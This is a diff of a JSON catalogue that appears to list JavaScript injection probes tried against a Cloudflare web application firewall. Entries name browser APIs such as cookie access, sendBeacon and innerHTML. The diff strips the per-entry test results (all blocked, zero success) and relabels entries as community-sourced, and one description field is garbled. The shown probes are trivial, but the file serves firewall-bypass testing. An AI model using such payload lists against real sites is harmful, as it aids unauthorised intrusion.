-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0521",
@@ -2573,11 +1251,7 @@
       "description": "frames",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0522",
@@ -2587,11 +1261,7 @@
       "description": "length",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0523",
@@ -2601,11 +1271,7 @@
       "description": "location",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0524",
@@ -2615,11 +1281,7 @@
       "description": "document",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0525",
@@ -2629,11 +1291,7 @@
       "description": "history",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0526",
@@ -2643,11 +1301,7 @@
       "description": "navigator",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0527",
@@ -2657,11 +1311,7 @@
       "description": "screen",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0528",
@@ -2671,11 +1321,7 @@
       "description": "status",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0529",
@@ -2685,11 +1331,7 @@
       "description": "opener",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0530",
@@ -2699,11 +1341,7 @@
       "description": "closed",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0531",
@@ -2713,11 +1351,7 @@
       "description": "constructor",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0532",
@@ -2727,11 +1361,7 @@
       "description": "__proto__",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0533",
@@ -2741,11 +1371,7 @@
       "description": "prototype",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0543",
@@ -2755,11 +1381,7 @@
       "description": "fetch",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0544",
@@ -2769,11 +1391,7 @@
       "description": "open",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0545",
@@ -2783,11 +1401,7 @@
       "description": "close",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0546",
@@ -2797,11 +1411,7 @@
       "description": "stop",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0547",
@@ -2811,11 +1421,7 @@
       "description": "blur",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0548",
@@ -2825,11 +1431,7 @@
       "description": "focus",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0549",
@@ -2839,11 +1441,7 @@
       "description": "scroll",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0550",
@@ -2853,11 +1451,7 @@
       "description": "scrollTo",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0551",
@@ -2867,11 +1461,7 @@
       "description": "scrollBy",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0552",
@@ -2881,11 +1471,7 @@
       "description": "find",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0553",
@@ -2895,11 +1481,7 @@
       "description": "atob",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0554",
@@ -2909,11 +1491,7 @@
       "description": "btoa",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0555",
@@ -2923,11 +1501,7 @@
       "description": "parseInt",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0556",
@@ -2937,11 +1511,7 @@
       "description": "parseFloat",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0557",
@@ -2951,11 +1521,7 @@
       "description": "isNaN",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0558",
@@ -2965,11 +1531,7 @@
       "description": "isFinite",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0559",
@@ -2979,11 +1541,7 @@
       "description": "encodeURI",
       "technique": "encoding",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0560",
@@ -2993,11 +1551,7 @@
       "description": "decodeURI",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0561",
@@ -3007,11 +1561,7 @@
       "description": "encodeURIComponent",
       "technique": "encoding",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0562",
@@ -3021,11 +1571,7 @@
       "description": "String",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0563",
@@ -3035,11 +1581,7 @@
       "description": "Number",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0564",
@@ -3049,11 +1591,7 @@
       "description": "Boolean",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0565",
@@ -3063,11 +1601,7 @@
       "description": "Array",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0566",
@@ -3077,11 +1611,7 @@
       "description": "Object",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0567",
@@ -3091,11 +1621,7 @@
       "description": "Date",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0568",
@@ -3105,11 +1631,7 @@
       "description": "RegExp",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0569",
@@ -3119,11 +1641,7 @@
       "description": "Error",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0570",
@@ -3133,11 +1651,7 @@
       "description": "JSON-stringify",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0571",
@@ -3147,11 +1661,7 @@
       "description": "Math-random",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0572",
@@ -3161,11 +1671,7 @@
       "description": "setTimeout",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0573",
@@ -3175,11 +1681,7 @@
       "description": "setInterval",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0574",
@@ -3189,11 +1691,7 @@
       "description": "raf",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0575",
@@ -3203,11 +1701,7 @@
       "description": "queueMicrotask",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0576",
@@ -3217,11 +1711,7 @@
       "description": "Function",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0578",
@@ -3231,11 +1721,7 @@
       "description": "Proxy",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0579",
@@ -3245,11 +1731,7 @@
       "description": "doc-write",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0580",
@@ -3259,11 +1741,7 @@
       "description": "doc-writeln",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0581",
@@ -3273,11 +1751,7 @@
       "description": "doc-cookie",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0582",
@@ -3287,11 +1761,7 @@
       "description": "doc-domain",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0583",
@@ -3301,11 +1771,7 @@
       "description": "doc-title",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0584",
@@ -3315,11 +1781,7 @@
       "description": "doc-title-set",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0585",
@@ -3329,11 +1791,7 @@
       "description": "doc-body",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0586",
@@ -3343,11 +1801,7 @@
       "description": "doc-createElement",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0587",
@@ -3357,11 +1811,7 @@
       "description": "doc-getElementById",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0588",
@@ -3371,11 +1821,7 @@
       "description": "loc-set",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0589",
@@ -3385,11 +1831,7 @@
       "description": "loc-href",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0590",
@@ -3399,11 +1841,7 @@
       "description": "loc-href-set",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0591",
@@ -3413,11 +1851,7 @@
       "description": "loc-assign",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0592",
@@ -3427,11 +1861,7 @@
       "description": "loc-replace",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0593",
@@ -3441,11 +1871,7 @@
       "description": "loc-reload",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0594",
@@ -3455,11 +1881,7 @@
       "description": "loc-hash",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0595",
@@ -3469,11 +1891,7 @@
       "description": "loc-search",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0596",
@@ -3483,11 +1901,7 @@
       "description": "loc-pathname",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0597",
@@ -3497,11 +1911,7 @@
       "description": "history-push",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0598",
@@ -3511,11 +1921,7 @@
       "description": "history-replace",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0599",
@@ -3525,11 +1931,7 @@
       "description": "history-back",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0600",
@@ -3539,11 +1941,7 @@
       "description": "history-go",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0601",
@@ -3553,11 +1951,7 @@
       "description": "win-open",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0602",
@@ -3567,11 +1961,7 @@
       "description": "win-close",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0603",
@@ -3581,11 +1971,7 @@
       "description": "win-stop",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0604",
@@ -3595,11 +1981,7 @@
       "description": "win-print",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0605",
@@ -3609,11 +1991,7 @@
       "description": "win-name",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0606",
@@ -3623,11 +2001,7 @@
       "description": "win-name-set",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0607",
@@ -3637,25 +2011,7 @@
       "description": "xhr",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0608",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "fetch(\"/\")",
-      "description": "fetch-2",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0609",
@@ -3665,11 +2021,7 @@
       "description": "\")', 'sendBeacon",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0610",
@@ -3679,11 +2031,7 @@
       "description": "innerHTML",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0611",
@@ -3693,11 +2041,7 @@
       "description": "outerHTML",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0612",
@@ -3707,109 +2051,7 @@
       "description": "textContent",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0615",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "1+1",
-      "description": "add",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0616",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "1-1",
-      "description": "sub",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0617",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "1*1",
-      "description": "mul",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0618",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "1/1",
-      "description": "div",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0619",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "1%1",
-      "description": "mod",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0620",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "1**1",
-      "description": "pow",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0621",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "1==1",
-      "description": "eq",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0622",
@@ -3819,25 +2061,7 @@
       "description": "seq",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0623",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "1!=1",
-      "description": "neq",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0624",
@@ -3847,39 +2071,7 @@
       "description": "sneq",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0625",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "1<2",
-      "description": "lt",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0626",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "1>0",
-      "description": "gt",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0627",
@@ -3889,11 +2081,7 @@
       "description": "typeof",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0628",
@@ -3903,11 +2091,7 @@
       "description": "delete",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0629",
@@ -3917,11 +2101,7 @@
       "description": "new",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0630",
@@ -3931,11 +2111,7 @@
       "description": "in",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0631",
@@ -3945,11 +2121,7 @@
       "description": "instanceof",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0633",
@@ -3959,11 +2131,7 @@
       "description": "throw",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0634",
@@ -3973,25 +2141,7 @@
       "description": "debugger",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0635",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "x=1",
-      "description": "assign-x",
-      "technique": "direct_injection",
-      "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0636",
@@ -4001,11 +2151,7 @@
       "description": "assign-self",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0637",
@@ -4015,11 +2161,7 @@
       "description": "assign-top",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0638",
@@ -4029,11 +2171,7 @@
       "description": "assign-parent",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0643",
@@ -4043,53 +2181,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0645",
-      "category": "other",
